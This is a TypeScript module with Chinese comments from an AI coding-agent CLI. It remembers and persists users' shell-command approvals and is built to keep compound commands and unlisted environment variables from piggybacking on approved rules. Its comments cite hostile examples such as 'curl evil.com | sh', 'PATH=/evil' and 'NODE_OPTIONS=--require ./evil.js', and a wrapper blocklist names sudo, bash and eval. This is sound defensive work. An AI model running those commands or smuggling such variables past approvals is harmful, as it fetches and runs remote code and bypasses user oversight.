// @x-code-cli/core — 带磁盘持久化的权限记忆
//
// 当用户对某次工具调用选择“不要再问”时，这个决定会被表示成一条 AllowRule，
// 同时写入内存和磁盘文件 `.x-code/local/permissions.json`。
// 下次启动时会重新加载这些持久化规则，让授权决定能够跨会话保留。
import * as fs from 'node:fs'
import * as path from 'node:path'

import { isReadOnly, splitShellCommands } from '../tools/shell-utils.js'
import { XCODE_DIR } from '../utils.js'

export interface AllowRule {
  tool: string // 规则作用的工具名
  pattern: string // 匹配模式内容
  type: 'exact' | 'prefix' | 'tool' // 规则匹配类型
}

// 环境变量赋值前缀：VAR=value（不带引号，且仅允许安全字符）。
// 捕获组会取出变量名，以便白名单判断它应该被剥离，还是应视为危险前缀
//（见 SAFE_ENV_VARS）。
const ENV_VAR_RE = /^([A-Za-z_]\w*)=[A-Za-z0-9_./:@-]*\s+/

// 在生成“不要再问”前缀规则前，允许安全剥离的环境变量名集合。
// 这里故意非常保守：凡是可能以安全敏感方式改变程序行为的变量
//（如 PATH、LD_*、NODE_OPTIONS、http(s)_proxy、DYLD_* 等）都不在白名单内，
// 这样一来，只要赋值不在白名单里，规则就会退化为 exact-match。
// 否则 agent 可能会把未审计的环境变量偷偷塞进一个已经被批准的命令形状里。
//
// 这个集合主要覆盖 agent 常见会输出的 NODE_ENV / CI / DEBUG /
// locale / 颜色配置等，整体思路与 Claude Code 的 SAFE_ENV_VARS 一致。
const SAFE_ENV_VARS = new Set([
  'NODE_ENV',
  'PYTHONUNBUFFERED',
  'PYTHONIOENCODING',
  'PYTHONDONTWRITEBYTECODE',
  'CI',
  'DEBUG',
  'FORCE_COLOR',
  'NO_COLOR',
  'CLICOLOR',
  'CLICOLOR_FORCE',
  'TERM',
  'COLORTERM',
  'LANG',
  'LC_ALL',
  'LC_CTYPE',
  'LC_MESSAGES',
  'LC_TIME',
  'LC_COLLATE',
  'TZ',
  'EDITOR',
  'VISUAL',
  'PAGER',
  'LESS',
])

// 某些首 token 包装器过于宽泛，不能拿来做“不要再问”的前缀锚点。
// 比如用户批准一次 `sudo ls`，绝不能顺带自动批准 `sudo <任何命令>`。
// 同时我们目前也不会继续拆开 `bash -c "<inner>"` 去重新提取内部命令，
// 因此这类情况统一返回 null，强制退回 exact-match。
// `sudo` 其实也会在上游被 isDestructive() 捕获；这里再次列出是为了纵深防御。
const WRAPPER_BLOCKLIST = new Set([
  'sudo',
  'doas',
  'su',
  'bash',
  'sh',
  'zsh',
  'fish',
  'dash',
  'ksh',
  'cmd',
  'env',
  'time',
  'nice',
  'ionice',
  'timeout',
  'nohup',
  'xargs',
  'watch',
  'parallel',
  'exec',
  'eval',
])

// 各命令的“全局参数”表：用于识别 `cmd` 和真正子命令之间的 token。
// 没有这张表的话，`git -C /tmp commit` 会错误提取成 `git -C`，
// 从而匹配不到用户原本针对 `git commit` 保存的前缀规则。
//
// `valued` 表示该 flag 会吞掉后一个 token；
// 其他以 `-` 开头的都按布尔开关处理（跳过一个 token）。
// `--name=value` 通过内嵌的 `=` 来识别。
// `cargo +toolchain` 是唯一需要额外跳过的“非 flag token”类型，由 `takesPlus` 控制。
const GLOBAL_FLAGS: Record<string, { valued: Set<string>; takesPlus?: boolean }> = {
  git: {
    valued: new Set(['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--exec-path', '--super-prefix']),
  },
  docker: {
    valued: new Set([
      '-H',
      '--host',
      '--config',
      '--context',
      '-c',
      '--log-level',
      '--tlscacert',
      '--tlscert',
      '--tlskey',
    ]),
  },
  podman: {
    valued: new Set(['--connection', '-c', '--log-level', '--root', '--runroot', '--storage-driver', '--url']),
  },
  kubectl: {
    valued: new Set([
      '-n',
      '--namespace',
      '--context',
      '--cluster',
      '--kubeconfig',
      '--server',
      '-s',
      '--user',
      '--token',
      '--as',
      '--as-group',
      '--cache-dir',
      '--certificate-authority',
      '--client-certificate',
      '--client-key',
    ]),
  },
  cargo: {
    valued: new Set(['--config', '-Z', '--color', '--manifest-path']),
    takesPlus: true,
  },
}

// 子命令名称形状：小写字母开头，后续为 [a-z0-9-]。
// 连字符只能出现在中间，不能以 `-` 结尾。
// 这样可以过滤掉 `-flag`、`/flag` 和路径类 token。
const SUBCOMMAND_RE = /^[a-z][a-z0-9]*(-[a-z0-9]+)*$/

// PowerShell 的 Verb-Noun cmdlet 形状，如 `Get-ChildItem`、
// `Sort-Object`、`Invoke-WebRequest` 等。
// 它由一个 Verb 段（首字母大写 + 其余小写）和一个或多个 Noun 段组成，
// 中间用 `-` 连接。每个 Noun 也必须大写开头，这样就不会把 `git-foo`
// 这种 Unix 风格的带横杠命令误判成 PowerShell cmdlet。
// 对这类命令来说，整个 token 本身就是前缀，因为它们接受的是
// `-Parameter Value` 参数，而不是子命令。
const VERB_NOUN_CMDLET_RE = /^[A-Z][a-z]+(?:-[A-Z][A-Za-z0-9]*)+$/

// 这些复合命令片段开头会被当作“仅做环境准备”的步骤，
// 例如真正命令前的目录切换。批准 `cd D:\foo && npm test` 时，
// 规则应该锚定在 `npm test`，而不是字面上的 `cd`。
// 同时兼容 POSIX（`cd`、`pushd`、`popd`、`chdir`）和 PowerShell
//（`Set-Location`、`Push-Location`、`Pop-Location` 及其 `sl` /
// `pushd` / `popd` 别名）。大小写不敏感，因为 PowerShell 本身也不区分大小写。
const CD_LIKE_RE = /^(?:cd|chdir|pushd|popd|set-location|push-location|pop-location|sl)\b/i

// 识别 `powershell` / `powershell.exe` / `pwsh` 的启动前缀。
// 这里不尝试匹配完整调用形式，因为 agent 可能使用很多 flag 变体
//（如 `-NoProfile`、`-ExecutionPolicy Bypass`、`-File foo.ps1`，
// 甚至不带 `-Command` 的裸调用）。
// 我们只需要识别“它是一个 PowerShell 启动器”，后续提取器会再跳过这些 flag，
// 去寻找内部真正的命令。
const POWERSHELL_LAUNCHER_RE = /^(?:powershell(?:\.exe)?|pwsh(?:\.exe)?)\b/i

// 从 PowerShell 内部脚本中提取第一个 cmdlet 或命令名。
// 同时支持 Verb-Noun cmdlet（如 Get-Process）和普通命令（如 git、npm）。
const PS_INNER_CMD_RE = /["']?\s*(?:&\s*\{?\s*)?([A-Za-z][A-Za-z0-9]*(?:-[A-Za-z0-9]+)+|[a-z][a-z0-9._-]*)/

/**
 * 提取适合做前缀匹配规则的命令前缀。
 * 当无法安全地推出有意义前缀时返回 `null`，调用方会回退到 exact-match。
 *
 *   'git commit -m "fix"'                                    → 'git commit'
 *   'git -C /tmp commit -m fix'                              → 'git commit'
 *   'docker -H tcp://host:2375 ps'                           → 'docker ps'
 *   'kubectl -n prod get pods'                               → 'kubectl get'
 *   'cargo +nightly build --release'                         → 'cargo build'
 *   'pnpm run build'                                         → 'pnpm run'
 *   'npm install lodash'                                     → 'npm install'
 *   'NODE_ENV=prod npm run dev'                              → 'npm run'
 *   'FOO=1 git status'                                       → null   (unsafe env)
 *   'sudo npm install'                                       → null   (wrapper)
 *   'bash -c "git status"'                                   → null   (wrapper)
 *   'powershell -Command "Get-CimInstance ..."'              → 'Get-CimInstance'
 *   'powershell -NoProfile -Command "Get-CimInstance ..."'   → 'Get-CimInstance'
 *   'powershell -ExecutionPolicy Bypass -c "git status"'     → 'git'
 *   'pwsh -Command "& { Get-Process }"'                      → 'Get-Process'
 *   'powershell -Command Get-Date'                           → 'Get-Date'
 *   'Get-ChildItem -Recurse -Filter *.ts'                    → 'Get-ChildItem'
 *   'Invoke-WebRequest -Uri http://api'                      → 'Invoke-WebRequest'
 *   'cd /tmp && npm test'                                    → 'npm test'
 *   'cd D:\\foo && npx tsc --noEmit | head -40'              → 'npx tsc'
 *   'Set-Location D:\\foo; Get-ChildItem -Recurse | Sort-Object Name'
 *                                                            → 'Get-ChildItem'
 *   'npm install && curl bad.com'                            → null
 *                                                              （两个不同的
 *                                                              非只读片段，
 *                                                              没有共享前缀，
 *                                                              因此回退到
 *                                                              exact）
 *   'git commit -m a && git push'                            → null   （各片段
 *                                                              前缀不一致）
 *   'ls -la'                                                 → null
 *   ''                                                       → null
 */
export function extractCommandPrefix(command: string): string | null {
  const cmd = command.trim()
  if (!cmd) return null

  // PowerShell 启动器命令（如 `powershell.exe -Command "..."`）要把整条字符串
  // 当成一个整体处理，因为内部脚本可能包含 `;` 或 `|`，
  // 如果先走 splitShellCommands 会被错误切开。
  if (POWERSHELL_LAUNCHER_RE.test(cmd)) {
    return extractPowershellPrefix(cmd)
  }

  // 对复合命令（`;`、`&&`、`||`、`|`），只有当所有非只读片段都能推出同一前缀时，
  // 才允许提取前缀。只读片段（如 `cd /foo`、`head -40`、`Sort-Object Name`）
  // 只是准备或展示动作，会被跳过，因此 `cd /foo && npm test` 会锚定到 `npm test`；
  // 而 `git commit && git push` 会返回 null，因为批准 `git commit`
  // 绝不能隐式批准 `git push`。
  //
  // 先拆分还有一个安全收益：老的单片段提取逻辑会把
  // `npm install && curl bad.com | sh` 误识别成 `npm install`，
  // 这会让一个已批准的 `npm install:*` 规则静默放过后面的 curl 管道执行。
  // 虽然 `curl … | sh` 本身会上游被 isDestructive 抓到，但这个原则适用于更广泛场景：
  // 第二个非只读片段不能借第一个片段的规则蒙混过关。
  const segments = splitShellCommands(cmd)
  if (segments.length > 1) {
    let derived: string | null = null
    for (const seg of segments) {
      if (isReadOnly(seg) || CD_LIKE_RE.test(seg.trim())) continue
      const segPrefix = extractSingleCommandPrefix(seg)
      if (!segPrefix) return null
      if (derived === null) derived = segPrefix
      else if (derived !== segPrefix) return null
    }
    return derived
  }

  return extractSingleCommandPrefix(cmd)
}

/**
 * 从单条 shell 命令中提取前缀（不含复合操作符）。
 * 这是 {@link extractCommandPrefix} 的内部实现，默认调用方已经按
 * `;` / `&&` / `||` / `|` 把命令拆成单个片段再传入。
 */
function extractSingleCommandPrefix(command: string): string | null {
  const cmd = command.trim()
  if (!cmd) return null

  const tokens = cmd.split(/\s+/).filter(Boolean)
  if (tokens.length === 0) return null

  // 逐 token 剥离环境变量前缀。开头形如 NAME=... 的 token 必须在白名单里，
  // 否则就立即终止提取。这样可以防止 agent 把 PATH=/evil、
  // NODE_OPTIONS=--require ./evil.js、http_proxy=... 之类的危险环境
  // 混进一个看起来像 `npm run` 的规则里。
  // 这里刻意不限制 value 的字符集，因为真正决定安全性的关键在变量名；
  // 如果对值做随意限制，反而可能让一些奇怪但安全的值（如 `/`、`$`、`:`）
  // 绕过检查。
  let i = 0
  while (i < tokens.length) {
    const tok = tokens[i]!
    const m = /^([A-Za-z_]\w*)=/.exec(tok)
    if (!m) break
    if (!SAFE_ENV_VARS.has(m[1]!)) return null
    // 如果一个带引号的值跨越空白被拆开（如 `FOO="a b" cmd`），
    // 说明当前的 `\s+` 分词已经破坏了值边界。没有真正的 shell parser
    // 就无法知道值到底在哪里结束，因此直接拒绝提取前缀。
    const value = tok.slice(m[0].length)
    if (hasUnclosedQuote(value)) return null
    i++
  }

  const rest = tokens.slice(i)
  if (rest.length === 0) return null

  // PowerShell cmdlet（如 `Get-ChildItem`）本身就是完整前缀，
  // 因为它们不像 `git` / `docker` 那样还有子命令，而是直接接 `-Parameter`。
  // 旧逻辑会死等一个符合 SUBCOMMAND_RE 的第二个 token，
  // 导致 `Get-ChildItem -Recurse ...` 这类命令被默默判成 null。
  // 这里识别到 cmdlet 形状后直接返回它本身。
  // 这一分支必须放在 `rest.length < 2` 之前，这样裸 `Get-Process`
  // 也能成为合法前缀，语义上相当于 PowerShell 世界里的 `git status:*`。
  if (VERB_NOUN_CMDLET_RE.test(rest[0]!)) {
    return rest[0]!
  }

  if (rest.length < 2) return null

  const firstLower = rest[0]!.toLowerCase()
  if (WRAPPER_BLOCKLIST.has(firstLower)) return null

  const subIdx = skipGlobalFlags(rest, firstLower)
  if (subIdx >= rest.length) return null

  const sub = rest[subIdx]!
  if (!SUBCOMMAND_RE.test(sub)) return null

  return `${rest[0]} ${sub}`
}

/** 判断字符串里是否存在未闭合的单引号或双引号。 */
function hasUnclosedQuote(s: string): boolean {
  let sq = 0
  let dq = 0
  for (const ch of s) {
    if (ch === "'") sq++
    else if (ch === '"') dq++
  }
  return sq % 2 === 1 || dq % 2 === 1
}

/** 跳过命令前面的全局 flag，返回真正子命令所在的 token 下标。 */
function skipGlobalFlags(tokens: string[], firstLower: string): number {
  const cfg = GLOBAL_FLAGS[firstLower]
  if (!cfg) return 1
  let i = 1
  while (i < tokens.length) {
    const tok = tokens[i]!
    if (cfg.takesPlus && tok.startsWith('+')) {
      i++
      continue
    }
    if (!tok.startsWith('-')) break
    // `--flag=value` 是单 token 形式，因此只前进一步。
    if (tok.includes('=')) {
      i++
      continue
    }
    if (cfg.valued.has(tok)) {
      i += 2
      continue
    }
    // 未知的布尔型 flag 按尽力而为方式跳过。
    // 这里偏向“尽可能找到真实子命令”，更符合用户在 CLI 中的直觉。
    i++
  }
  return i
}

/** 从 PowerShell 启动命令中提取内部真正执行的命令前缀。 */
function extractPowershellPrefix(cmd: string): string | null {
  const tokens = cmd.split(/\s+/).filter(Boolean)
  let i = 1 // skip launcher
  while (i < tokens.length) {
    const tok = tokens[i]!
    if (!tok.startsWith('-')) break
    const lower = tok.toLowerCase()
    if (lower === '-command' || lower === '-c') {
      i++
      break
    }
    if (lower === '-file') return null
    if (
      lower === '-executionpolicy' ||
      lower === '-encodedcommand' ||
      lower === '-inputformat' ||
      lower === '-outputformat' ||
      lower === '-version' ||
      lower === '-windowstyle' ||
      lower === '-configurationname' ||
      lower === '-mta' ||
      lower === '-sta'
    ) {
      i += 2
      continue
    }
    i++
  }
  if (i >= tokens.length) return null
  const inner = tokens.slice(i).join(' ')
  const m = PS_INNER_CMD_RE.exec(inner)
  return m?.[1] ?? null
}

/**
 * 与 {@link extractCommandPrefix} 类似，但在复合命令场景下会返回完整的
 * “去重前缀集合”，即每个非只读、非 cd 片段各给一个前缀。
 *
 * 如果任一非只读片段无法推导前缀，则返回 `null`
 * （如今调用方通常会用更强的 {@link extractCompoundRules} 来兜底）；
 * 如果所有片段都被过滤为只读 / cd 类步骤，也会返回 `null`
 *（主要是防御式处理，这类命令上游通常已经自动放行了）。
 *
 * 它继续保留导出，是为了兼容那些只关心前缀列表的调用方；
 * 当前内部调用大多已经切到更丰富的 {@link extractCompoundRules}。
 */
export function extractCompoundPrefixes(command: string): string[] | null {
  const cmd = command.trim()
  if (!cmd) return null

  if (POWERSHELL_LAUNCHER_RE.test(cmd)) {
    const p = extractPowershellPrefix(cmd)
    return p ? [p] : null
  }

  const segments = splitShellCommands(cmd)
  if (segments.length === 0) return null

  const seen = new Set<string>()
  const out: string[] = []
  for (const seg of segments) {
    if (isReadOnly(seg) || CD_LIKE_RE.test(seg.trim())) continue
    const p = extractSingleCommandPrefix(seg)
    if (!p) return null
    if (!seen.has(p)) {
      seen.add(p)
      out.push(p)
    }
  }
  return out.length === 0 ? null : out
}

/**
 * 针对复合命令逐片段提取规则。每个非只读、非 cd 片段都会得到一条规则：
 *   - 若该片段能推出前缀，则生成 prefix 规则
 *     （例如 `git commit -m foo` → `{ type: 'prefix', pattern: 'git commit' }`）
 *   - 否则退化为片段级 exact 规则
 *     （例如 `curl evil.com` → `{ type: 'exact', pattern: 'curl evil.com' }`）
 *
 * 这种“混搭”正是它的价值所在：
 * `git commit && curl evil.com` 过去会因为 `curl evil.com` 没法提取前缀，
 * 整体退化成“一条整命令 exact-match”，从而浪费掉本来完全可以复用的
 * `git commit:*`。现在标签会变成 `git commit:*, curl evil.com`，
 * 用户点击一次就能同时保存两条规则。
 * 匹配器也支持 exact 规则既可匹配整条命令，也可匹配任意非只读片段，
 * 因此未来像 `cd /tmp && git commit -m b && curl evil.com`
 * 这样的命令也能被干净地自动放行。
 *
 * 当没有任何片段产出规则时返回 `null`
 *（例如全是只读片段的复合命令，理论上上游已自动放行）；
 * 如果碰到不在白名单内的环境变量前缀，也会返回 `null`，
 * 安全策略与单命令路径保持一致。
 */
export function extractCompoundRules(command: string): AllowRule[] | null {
  const cmd = command.trim()
  if (!cmd) return null

  if (POWERSHELL_LAUNCHER_RE.test(cmd)) {
    const p = extractPowershellPrefix(cmd)
    return p ? [{ tool: 'shell', pattern: p, type: 'prefix' }] : null
  }

  const segments = splitShellCommands(cmd)
  if (segments.length === 0) return null

  const seen = new Set<string>()
  const out: AllowRule[] = []

  for (const seg of segments) {
    const trimmed = seg.trim()
    if (isReadOnly(trimmed) || CD_LIKE_RE.test(trimmed)) continue

    const prefix = extractSingleCommandPrefix(trimmed)
    if (prefix) {
      const key = `prefix:${prefix}`
      if (!seen.has(key)) {
        seen.add(key)
        out.push({ tool: 'shell', pattern: prefix, type: 'prefix' })
      }
      continue
    }

    // 无法提取前缀时，退回到“片段级 exact 规则”。
    // 会先剥离安全环境变量，让匹配键保持规范化；
    // 若存在不在白名单内的环境变量赋值，则直接拒绝，安全姿态与
    // extractSingleCommandPrefix 保持一致。
    const headEnv = /^([A-Za-z_]\w*)=/.exec(trimmed)
    if (headEnv && !SAFE_ENV_VARS.has(headEnv[1]!)) return null
    const exact = stripSafeEnvVars(trimmed)
    if (!exact) return null
    const key = `exact:${exact}`
    if (!seen.has(key)) {
      seen.add(key)
      out.push({ tool: 'shell', pattern: exact, type: 'exact' })
    }
  }

  return out.length === 0 ? null : out
}

/**
 * 生成“不要再问”选项的展示文案。
 * 只有当某些工具根本不适合提供“不要再问”能力时才返回 `null`
 *（目前仅 `enterPlanMode` 属于这种情况，因为它切换的是模式，不是重复动作）。
 *
 * Shell，单个可提取前缀：`git commit:*`
 * Shell，多个不同前缀（如 `git commit && git push`）：`git commit:*, git push:*`
 *   用户点一次会同时保存两条规则，后续同类复合命令就不再询问。
 * Shell，提取不到前缀：`仅这条精确命令`
 *   这对应 exact-match 规则，可覆盖 `findstr /n ...`、`cmd /c ...`、`dir /b`
 *   这类第二个 token 是 `/flag` 或路径、无法通过前缀正则的 Windows 命令。
 *   没有这个兜底的话，用户对重复的完全相同命令会永远只能点 Yes/No。
 * 写工具（writeFile / edit）：`本次会话内的所有编辑`
 * MCP 工具（isMcp=true）：`这个 MCP 工具`
 *   它会通过 McpPermissionStore 持久化到磁盘，因此标签也要体现这一点；
 *   与之不同，写工具仍然只保存到当前会话。
 */
export function suggestRuleLabel(toolName: string, input: Record<string, unknown>, isMcp = false): string | null {
  if (toolName === 'enterPlanMode') return null
  if (isMcp) return '这个 MCP 工具'
  if (toolName === 'shell') {
    const cmd = (input.command as string) ?? ''
    const rules = extractCompoundRules(cmd)
    if (!rules || rules.length === 0) return '仅这条精确命令'
    // 如果只有一条 exact 规则，且它的 pattern 就等于完整命令本身，
    // 则继续使用简洁的旧文案，而不是把整条命令直接回显给用户。
    // 这样像 `findstr /n ...` / `cmd /c ...` 这类完全提取不到前缀的命令，
    // 仍能保持“仅这条精确命令”这种更易读的表述。
    if (rules.length === 1) {
      const r = rules[0]!
      if (r.type === 'exact' && r.pattern === stripSafeEnvVars(cmd)) return '仅这条精确命令'
    }
    return rules.map((r) => (r.type === 'prefix' ? `${r.pattern}:*` : r.pattern)).join(', ')
  }
  return '本次会话内的所有编辑'
}

/**
 * 为一次“不要再问”的授权构建对应的 AllowRule 集合。
 *
 * - Shell 且能提取前缀时：
 *   每个不同的非只读片段都会生成一条 prefix 规则。
 *   `git commit && git push` 一次点击就会保存 `git commit:*` 和 `git push:*`，
 *   与用户界面里展示的复合标签一致。规则会持久化到磁盘。
 * - Shell 但提取不到前缀时：
 *   退化为单条 exact-match 规则，也会持久化。
 *   这对应 Claude Code 在 `bashPermissions.ts` 里的
 *   `suggestionForExactCommand` 兜底策略。虽然它比前缀规则复用性差
 *   （参数一变就不匹配），但至少能避免“同一条命令每次都要重新点 Yes/No”。
 *   匹配时会与 `stripSafeEnvVars(cmd)` 比较，因此前面的 `NODE_ENV=...`
 *   之类不会让规则失效。
 * - writeFile / edit：
 *   生成单条工具级允许规则，仅在当前会话有效，与 Claude Code 保持一致。
 *
 * `persist` 表示这些规则是否需要写入磁盘。
 * 写工具返回 `persist=false`，其他情况返回 `persist=true`。
 * 只有在极少数完全无法构造规则的情况下才会返回 `null`
 *（目前实际上没有这种分支，签名保留主要是让调用方继续保持防御式写法）。
 */
export function buildAllowRule(
  toolName: string,
  input: Record<string, unknown>,
): { rules: AllowRule[]; persist: boolean } | null {
  if (toolName === 'shell') {
    const cmd = (input.command as string) ?? ''
    const rules = extractCompoundRules(cmd)
    if (rules && rules.length > 0) {
      return { rules, persist: true }
    }
    // 这里只剥离“安全”的环境变量前缀，与匹配器使用的键
    //（stripSafeEnvVars）保持一致。不在白名单内的赋值会原样保留在 pattern 里，
    // 这样对 `BACKDOOR=1 findstr ...` 的一次授权，不会意外放行裸 `findstr ...`。
    const exact = stripSafeEnvVars(cmd)
    if (!exact) return null
    return { rules: [{ tool: toolName, pattern: exact, type: 'exact' }], persist: true }
  }
  return { rules: [{ tool: toolName, pattern: '*', type: 'tool' }], persist: false }
}

/** 从命令头部剥离连续的安全环境变量赋值前缀。 */
function stripSafeEnvVars(command: string): string {
  let cmd = command.trim()
  while (true) {
    const m = ENV_VAR_RE.exec(cmd)
    if (!m) break
    if (!SAFE_ENV_VARS.has(m[1]!)) break
    cmd = cmd.slice(m[0].length)
  }
  return cmd.trim()
}

// ─── 序列化辅助函数 ────────────────────────────────────────────────────

/** 将规则对象编码为可持久化的字符串表示。 */
function ruleToString(rule: AllowRule): string {
  if (rule.type === 'tool') return `${rule.tool}:*`
  if (rule.type === 'prefix') return `${rule.tool}:${rule.pattern}:*`
  return `${rule.tool}:=${rule.pattern}`
}

/** 将磁盘中的字符串规则解析回结构化的 AllowRule。 */
function parseRuleString(s: string): AllowRule | null {
  // tool:*  → 工具级规则
  const toolWide = s.match(/^([^:]+):\*$/)
  if (toolWide) return { tool: toolWide[1]!, pattern: '*', type: 'tool' }
  // tool:prefix:*  → 前缀匹配规则
  const prefix = s.match(/^([^:]+):(.+):\*$/)
  if (prefix) return { tool: prefix[1]!, pattern: prefix[2]!, type: 'prefix' }
  // tool:=exact  → 精确匹配规则
  const exact = s.match(/^([^:]+):=(.+)$/)
  if (exact) return { tool: exact[1]!, pattern: exact[2]!, type: 'exact' }
  return null
}

/** 计算项目内权限持久化文件的绝对路径。 */
function getPermissionsPath(cwd: string): string {
  return path.join(cwd, XCODE_DIR, 'local', 'permissions.json')
}

// ─── 内存存储 ───────────────────────────────────────────────────────────

/** 会话级权限规则存储。
 *  负责在内存中保存本次会话已批准的规则，并提供匹配判断。 */
class SessionPermissionStore {
  private rules: AllowRule[] = []

  /** 向会话权限存储中添加一条规则，已存在则忽略。 */
  addRule(rule: AllowRule): void {
    const exists = this.rules.some((r) => r.tool === rule.tool && r.pattern === rule.pattern && r.type === rule.type)
    if (!exists) this.rules.push(rule)
  }

  /** 判断当前输入是否命中会话内已批准的权限规则。 */
  matches(toolName: string, input: Record<string, unknown>): boolean {
    if (toolName !== 'shell') {
      // 对非 shell 工具来说，目前只会生成 tool-wide 规则。
      // exact / prefix 两种规则都是 shell 专属。
      for (const rule of this.rules) {
        if (rule.tool !== toolName) continue
        if (rule.type === 'tool') return true
      }
      return false
    }

    const cmd = (input.command as string) ?? ''

    // 第一轮：tool-wide 与 exact 规则都直接作用于整条命令字符串。
    // 理论上用户也可能精确批准一条破坏性命令；既然是显式批准，我们就尊重它。
    for (const rule of this.rules) {
      if (rule.tool !== toolName) continue
      if (rule.type === 'tool') return true
      if (rule.type === 'exact' && stripSafeEnvVars(cmd) === rule.pattern) return true
    }

    // 第二轮：面向复合命令的前缀匹配。
    // 命令中的每一个“非只读、非 cd 类片段”，都必须单独命中至少一条已保存规则。
    // 这就是为什么用户对 `git commit && git push` 点一次批准后，
    // 未来像 `git commit -m foo && git push origin main` 也能自动放行。
    //
    // “每个片段都要匹配”本身就是安全闸门：
    // 如果用户只批准过 `git commit:*`，那么之后出现
    // `git commit -m a && curl evil.com | sh` 时仍然会继续询问，
    // 因为 `curl` 没有任何匹配规则。
    //（`| sh` 本身也会被上游 isDestructive 抓到，但这个原则并不局限于这一种模式。）
    const segments = splitShellCommands(cmd)
    const checkable = segments.filter((seg) => !isReadOnly(seg) && !CD_LIKE_RE.test(seg.trim()))
    if (checkable.length === 0) return false

    for (const seg of checkable) {
      const segText = stripSafeEnvVars(seg.trim())
      const segPrefix = extractSingleCommandPrefix(seg)
      let segMatched = false
      for (const rule of this.rules) {
        if (rule.tool !== toolName) continue
        if (rule.type === 'prefix' && segPrefix) {
          if (segPrefix === rule.pattern || segPrefix.startsWith(rule.pattern + ' ')) {
            segMatched = true
            break
          }
        } else if (rule.type === 'exact' && segText === rule.pattern) {
          // 片段级 exact 规则：主要覆盖混合复合规则中的 `curl evil.com` 这类片段。
          // 而上面整命令 exact 的检查，已经处理了旧式“整条复合命令逐字批准”的场景。
          segMatched = true
          break
        }
      }
      if (!segMatched) return false
    }
    return true
  }

  /** 清空当前会话内缓存的所有权限规则。 */
  clear(): void {
    this.rules = []
  }

  /** 返回当前会话内规则数量。 */
  get size(): number {
    return this.rules.length
  }
}

const store = new SessionPermissionStore()

/** 向会话内权限存储添加一条放行规则。 */
export function addSessionAllowRule(rule: AllowRule): void {
  store.addRule(rule)
}

/** 判断某次工具调用是否命中当前会话的放行规则。 */
export function sessionRulesMatch(toolName: string, input: Record<string, unknown>): boolean {
  return store.matches(toolName, input)
}

/** 清空当前会话中已缓存的所有权限规则。 */
export function clearSessionRules(): void {
  store.clear()
}

// ─── 磁盘持久化 ─────────────────────────────────────────────────────────

/**
 * 将 `.x-code/local/permissions.json` 中持久化的权限规则加载到内存存储里。
 * 可重复调用，内部会自动去重。
 * 如果文件不存在或内容损坏，会静默跳过。
 */
export function loadPersistedRules(cwd: string): void {
  const filePath = getPermissionsPath(cwd)
  let raw: string
  try {
    raw = fs.readFileSync(filePath, 'utf-8')
  } catch {
    return
  }
  let data: { allow?: string[] }
  try {
    data = JSON.parse(raw) as { allow?: string[] }
  } catch {
    return
  }
  if (!Array.isArray(data.allow)) return
  for (const entry of data.allow) {
    if (typeof entry !== 'string') continue
    const rule = parseRuleString(entry)
    if (rule) store.addRule(rule)
  }
}

/**
 * 将一条新规则持久化到 `.x-code/local/permissions.json`。
 * 文件不存在时会自动创建，并且会避免重复追加。
 */
export function persistRule(cwd: string, rule: AllowRule): void {
  const filePath = getPermissionsPath(cwd)
  const ruleStr = ruleToString(rule)

  const data: { allow: string[] } = { allow: [] }
  try {
    const raw = fs.readFileSync(filePath, 'utf-8')
    const parsed = JSON.parse(raw) as { allow?: string[] }
    if (Array.isArray(parsed.allow)) {
      data.allow = parsed.allow.filter((s): s is string => typeof s === 'string')
    }
  } catch {
    // 文件不存在或内容损坏时，直接从空白数据开始。
  }

  if (data.allow.includes(ruleStr)) return

  data.allow.push(ruleStr)

  const dir = path.dirname(filePath)
  fs.mkdirSync(dir, { recursive: true })
  // 保护 `.x-code/local/` 自身不被误提交。
  // permissions.json 里记录的是这个用户按自己风险偏好批准的 shell 模式，
  // 不应该泄漏进 git 历史。因此首次写入时会顺手补一个 `*` 的 .gitignore，
  // 即使用户项目没有整体忽略 `.x-code/`，这里也能保持安全。
  const gitignorePath = path.join(dir, '.gitignore')
  if (!fs.existsSync(gitignorePath)) {
    fs.writeFileSync(gitignorePath, '*\n', 'utf-8')
  }
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2) + '\n', 'utf-8')
}
